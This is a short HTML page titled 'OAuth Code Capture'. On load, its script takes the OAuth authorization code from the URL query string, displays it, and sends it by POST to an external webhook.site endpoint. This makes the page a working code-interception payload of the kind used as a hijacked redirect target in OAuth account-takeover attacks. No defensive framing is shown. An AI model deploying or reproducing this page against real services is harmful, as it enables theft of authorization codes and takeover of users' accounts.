<!DOCTYPE html>
<html>
<head><title>OAuth Code Capture</title></head>
<body>
  <h2>Processing...</h2>
  <script>
    const query = new URLSearchParams(window.location.search);
    const code = query.get("code");

    if (code) {
      document.body.innerHTML = "<h2>✅ Code Captured!</h2><p>" + code + "</p>";

      fetch("https://webhook.site/3b98c118-cca2-4303-9da8-ae30e2bb1fd1", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code: code })
      });
    } else {
      document.body.innerHTML = "<h2>❌ No code found.</h2>";
    }
  </script>
</body>
</html>
